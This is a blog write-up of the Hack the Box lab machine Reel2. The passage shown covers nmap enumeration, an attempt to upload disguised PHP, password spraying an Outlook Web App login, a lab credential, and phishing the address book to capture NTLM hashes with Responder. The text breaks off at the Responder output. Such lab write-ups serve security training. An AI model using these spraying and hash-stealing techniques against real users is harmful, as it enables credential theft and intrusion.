<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Reel2 Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the hard-difficulty machine Reel2 from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the hard-difficulty machine Reel2 from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/reel2/" /><meta property="og:url" content="https://zweilosec.github.io/posts/reel2/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/0-reel2-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-16T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/0-reel2-infocard.png" /><meta property="twitter:title" content="Hack the Box - Reel2 Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2021-02-16T14:00:00+00:00","description":"Zweilosec’s writeup on the hard-difficulty machine Reel2 from https://hackthebox.eu","headline":"Hack the Box - Reel2 Writeup","image":"https://zweilosec.github.io/assets/img/0-reel2-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/reel2/"},"url":"https://zweilosec.github.io/posts/reel2/"}</script><title>Hack the Box - Reel2 Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Reel2 Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Reel2 Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Feb 16, 2021, 2:00 PM +0000" prep="on" > Feb 16, 2021 <i class="unloaded">2021-02-16T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6693 words">37 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---reel2">HTB - Reel2</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/0-reel2-infocard.png" alt="Descriptive information card on the machine reel2" /></p><p>This machine was not as difficult in some respects as other Hard-difficulty machines, but the way that the machine was realistically hardened made it more challenging. The use of some newer Windows PowerShell hardening techniques, as well as ensuring authentication was required in a key location put this machine into the “hard” category. The path to root was otherwise rather straightforward, and just required simple attention to detail and some research to keep moving forward.</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="search-for-all-files-that-contain-a-certain-text-string">Search for all files that contain a certain text string</h3><p>Using PowerShell:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>dir -r C:\ -EA Silent | Select-String "Password"
</pre></table></code></div></div><p>This searches through files in the entire C:\ drive, silently ignoring errors, and selecting any that contain the word “Password” in them.</p><h3 id="mount-an-existing-folder-to-a-new-drive-letter"><strong>Mount an existing folder to a new drive letter</strong></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>New-PSDrive -Name "D" -PsProvider "FileSystem" -Root "C:\Users"\

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                         CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                         ---------------
D                                      FileSystem    C:\Users 
</pre></table></code></div></div><p>This will mount the entire<code class="language-plaintext highlighter-rouge">/Users</code> folder from the <code class="language-plaintext highlighter-rouge">C:\</code> drive to the drive letter <code class="language-plaintext highlighter-rouge">D:\</code>. You can then access the user’s folders as seen below:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cd D:\Administrator
</pre></table></code></div></div><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.210</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ nmap -sCV -n -p- -Pn -v -oA reel2 10.10.10.210
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 12:16 EST
Nmap scan report for 10.10.10.210

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: 403 - Forbidden: Access is denied.
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=Reel2
| Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local
| Issuer: commonName=Reel2
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2020-07-30T10:12:46
| Not valid after:  2025-07-30T10:12:46
| MD5:   aa49 5cac 7115 c7fe 0628 2a6b 0124 37c4
|_SHA-1: d7ea 2696 a56f 09cb 24ce 557f 830e 86ec 5f63 0f2d
|_ssl-date: 2021-02-15T17:29:51+00:00; +9m15s from scanner time.
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6001/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6002/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6004/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6005/tcp open  msrpc      Microsoft Windows RPC
6006/tcp open  msrpc      Microsoft Windows RPC
6007/tcp open  msrpc      Microsoft Windows RPC
6008/tcp open  msrpc      Microsoft Windows RPC
6010/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6011/tcp open  msrpc      Microsoft Windows RPC
6012/tcp open  msrpc      Microsoft Windows RPC
6017/tcp open  msrpc      Microsoft Windows RPC
6027/tcp open  msrpc      Microsoft Windows RPC
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32
|_http-title: Welcome | Wallstant
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m14s

Nmap done: 1 IP address (1 host up) scanned in 241.37 seconds
</pre></table></code></div></div><p>My nmap scan showed lots of TCP ports open. I saw 80 - HTTP, 443 - HTTPS, 8080 - HTTP, 5985 - Windows Remote Management, and RPC on a bunch of ports 6000+.</p><p>From the nmap scan I also saw a DNS domain name <code class="language-plaintext highlighter-rouge">Reel2.htb.local</code> in the port 443 information. I added this domain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and proceeded with my enumeration.</p><h3 id="port-80---http">Port 80 - HTTP</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-80-forbidden.png" alt="" /></p><p>I opened a web browser and navigated to <code class="language-plaintext highlighter-rouge">http://reel2.htb.local</code>, but this simply led to a 403 - Forbidden error page. I also ran a dirbuster scan in the background but found nothing useful.</p><h3 id="port-8080---http">Port 8080 - HTTP</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant.png" alt="" /></p><p>Trying the same for port 8080 led to a login page for something called “WallStant”. It looked like some kind of social media site.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-signup.png" alt="" /></p><p>I created an account after clicking on the “Sign Up” button.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-in.png" alt="" /></p><p>After logging in I found myself in something that looked like an old version of Facebook.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-edit.png" alt="" /></p><p>I saw a link for editing my profile. I was hoping for the ability to upload a profile picture, but unfortunately it did not seem to actually be an option.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-photo.png" alt="" /></p><p>I found the option I was looking for on my ‘test’ user’s profile page. There was an upload button for changing the profile and banner images. First I tested it by uploading one of my enumeration screenshots.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-nophoto.png" alt="" /></p><p>After validating that I could indeed upload files, I tried to upload a PHP code exec script (though I wasn’t sure if PHP even ran here…) but the file had to be an image. I was able to upload a photo, so next I loaded Burp to see if I could fool it into loading code.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-burp-php.png" alt="" /></p><p>I was able to upload my disguised PHP file, but I couldn’t get code execution. I did notice that the response contained the <code class="language-plaintext highlighter-rouge">X-Powered-By</code> header that told me that it was using PHP/7.2.32, so I checked to see if I could find any vulnerabilities associated with that version.</p><ul><li><a href="https://snyk.io/vuln/SNYK-DEBIAN10-CURL-573151">https://snyk.io/vuln/SNYK-DEBIAN10-CURL-573151</a><li><a href="https://www.cvebase.com/cve/2020/8177">https://www.cvebase.com/cve/2020/8177</a><li><a href="https://hackerone.com/reports/887462">https://hackerone.com/reports/887462</a></ul><p>I found a number of vulnerabilities associated with this version, including one that pointed to a version of curl that is included that could lead to code execution using the <code class="language-plaintext highlighter-rouge">-J</code> flag is used to overwrite a local file</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-php-vuln.png" alt="" /></p><p>Unfortunately, after reading the HackerOne report it seemed as if it was not useful in this case unless I could somehow make requests from the machine using curl (not libcurl).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-3posts.png" alt="" /></p><p>Back on the Wallstant page there was a “Trending Posts” box that had three potential usernames (and I saw that one of my XXS tests was trending!). I wondered what a ‘fika` was, so I looked it up.</p><ul><li><a href="https://www.swedishfood.com/fika">https://www.swedishfood.com/fika</a></ul><blockquote><p>fika is a traditional Swedish coffee break with friends</p></blockquote><p>I wrote it down as a potential partial password and continued on.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-users.png" alt="" /></p><p>The other trending Pages tab contained more potential usernames.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>-- phpMyAdmin SQL Dump
-- version 4.9.0.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Sep 14, 2019 at 03:42 PM
-- Server version: 10.4.6-MariaDB
-- PHP Version: 7.3.9
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-database.png" alt="" /></p><p>Dirbuster found a <code class="language-plaintext highlighter-rouge">/_database</code> folder which contained a <code class="language-plaintext highlighter-rouge">wallstant.sql</code> SQL database.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-database-sn.png" alt="" /></p><p>There was not much useful information other than version numbers.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-report1.png" alt="" /></p><p>Report a problem? Sure I was having a problem with accessing your machine, could you let me in?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-report.png" alt="" /></p><p>I wasn’t able to get this to connect back to my machine, though. After testing for XSS, SQLi, and doing other tests in each of the input fields, there did not seem to be much else I could do here. I decided to see if there was anything useful on port 443.</p><h3 id="port-443---https">Port 443 - HTTPS</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/3-443-cert.png" alt="" /></p><p>I checked out the certificate, but other than the domain name I had already discovered there was no useful information.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/3-443-iis.png" alt="" /></p><p>The HTTPS port only led to a blank IIS Welcome page. I loaded Dirbuster again to see if there was anything other than the index page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/3-dirbuster-owa.png" alt="" /></p><p>Dirbuster quickly returned a few folders, including <code class="language-plaintext highlighter-rouge">public</code> and <code class="language-plaintext highlighter-rouge">owa</code>. Both sounded interesting, so I loaded public first.</p><h3 id="getting-owa-credentials">Getting OWA credentials</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/3-443-owa.png" alt="" /></p><p>Navigating to <code class="language-plaintext highlighter-rouge">https://Reels.htb.local/public</code> redirected to an Outlook Web Application login page. Since I had a list of names to make usernames from, I decided to try to brute force the login. Searching for OWA brute force led to a tool by <code class="language-plaintext highlighter-rouge">byt3bl33d3r</code>.</p><ul><li><a href="https://github.com/byt3bl33d3r/SprayingToolkit">https://github.com/byt3bl33d3r/SprayingToolkit</a></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
└─$ ~/SprayingToolkit/atomizer.py owa https://Reel2.htb.local/owa ~/rockyou_utf8.txt usernames --threads 20
[*] Using 'https://reel2.htb.local/owa' as URL
[-] Error parsing internal domain name using OWA. This usually means OWA is being hosted on-prem or the target has a hybrid AD deployment
    Do some recon and pass the custom OWA URL as the target if you really want the internal domain name, password spraying can still continue though :)
</pre></table></code></div></div><p>The first time I ran the tool it gave me a very helpful error message that explained I needed to use the full internal custom URL. I looked up how to find the custom OWA URL, and found what I was looking for in Microsoft’s Exchange documentation.</p><ul><li><a href="https://docs.microsoft.com/en-us/Exchange/architecture/client-access/autodiscover?view=exchserver-2019">https://docs.microsoft.com/en-us/Exchange/architecture/client-access/autodiscover?view=exchserver-2019</a></ul><blockquote><p>The Autodiscover service uses one of these four methods to configure the email client. The first two work for small, single SMTP namespace organizations. The last two serve multiple-SMTP namespaces.</p><ul><li>Connect to: <a href="https://contoso.com/AutoDiscover/AutoDiscover.xml">https://contoso.com/AutoDiscover/AutoDiscover.xml</a><li>Connect to: <a href="https://autodiscover.contoso.com/AutoDiscover/AutoDiscover.xml">https://autodiscover.contoso.com/AutoDiscover/AutoDiscover.xml</a><li>Autodiscover redirect URL for redirection: <a href="http://autodiscover.contoso.com/autodiscover/autodiscover.xml">http://autodiscover.contoso.com/autodiscover/autodiscover.xml</a><li>Search for DNS SRV record</ul></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-owa-autodiscovery.png" alt="" /></p><p>I tried to access <code class="language-plaintext highlighter-rouge">autodiscover/Autodiscover.xml</code>, but I kept having errors and was required to login to access it. This also prevented the OWA brute force tool from enumerating the machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-owa-broken.png" alt="" /></p><p>The night I was doing this machine I kept getting crashes from the OWA web app and all sorts of other problems, including the portal being extremely slow. I am not sure if this is normal on this machine or if it was being overly taxed by other users.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-owa-broken2.png" alt="" /></p><p>These errors made me rethink brute-forcing the portal. Since it seemed like other users were also pounding the server, I reset the machine and looked around a bit more to see if I had missed something.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-fika.png" alt="" /></p><p>I checked each profile page for clues for the password to log in. I tried combinations of fika + 2020 etc. For the username I tried different combinations of username, first name, and last name.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-8080-wallstant-svenson.png" alt="" /></p><p>Next I tried combinations of summer + 2020.</p><h3 id="the-owa-portal">The OWA Portal</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-owa-login.png" alt="" /></p><p>After a lot of tries, I was able to log into the OWA with the credentials <code class="language-plaintext highlighter-rouge">HTB\s.svenson:Summer2020</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-owa-loggedin.png" alt="" /></p><p>The first thing I noticed was that the page was in Swedish, but since I have used OWA before it was not much of a problem. There was no mail, notes, contacts, or anything to look through.</p><ul><li><a href="https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook">https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook</a><li><a href="https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html">https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html</a></ul><p>After searching for awhile for ways to steal information through Outlook, I found a few articles that explained how to get NTLMv2 hashes by sending a link to the attackers box and having the email simply viewed in the Preview Pane.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-owa-addressbook.png" alt="" /></p><p>I opened the address book, and saw a long list of addresses available. I selected all them and clicked on the button to send a new email.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-owa-popup.png" alt="" /></p><p>I received an error from Firefox saying popups had been blocked, but clicking “Ja” (Yes) in the dialog box allowed the new mail window to open.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-owa-phish2.png" alt="" /></p><p>I used Google translate to send an email inviting everyone to check out the new NAS link, which was a link to my machine. I tried sending as both a web link and as an SMB share just in case. After that I fired up <code class="language-plaintext highlighter-rouge">Responder</code> to see what I could catch.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/reel2]
